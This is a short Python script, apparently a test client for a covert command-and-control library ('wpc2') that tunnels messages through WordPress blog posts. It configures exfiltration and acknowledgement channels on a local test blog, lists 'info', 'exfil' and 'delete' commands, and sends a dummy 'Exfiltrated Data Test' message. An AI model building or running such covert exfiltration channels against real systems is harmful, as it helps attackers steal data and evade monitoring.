#!/usr/bin/env python3

from wpc2 import *
import datetime
import random
import sys

random.seed(int(datetime.datetime.now().timestamp()) + int(sys.argv[1]))

commands = [ "info", "exfil", "delete" ]

channel = Channel()
channel.target_blog = "http://127.0.0.3/"
channel.exfil_channel = "2021/08/13/exfil-channel/"
channel.exfil_channel_id = 5
channel.ack_channel = "2021/08/13/ack-channel/"
channel.ack_channel_id = 7

btm_send_config= SendConfig()
btm_send_config.send_time_slot = 10
btm_send_config.confirm_time_slot = 30

message = Message()
message.message_id = generate_random_string(10)
message.message = message.message_id + ": Exfiltrated Data Test"
send_data(channel, message, btm_send_config)
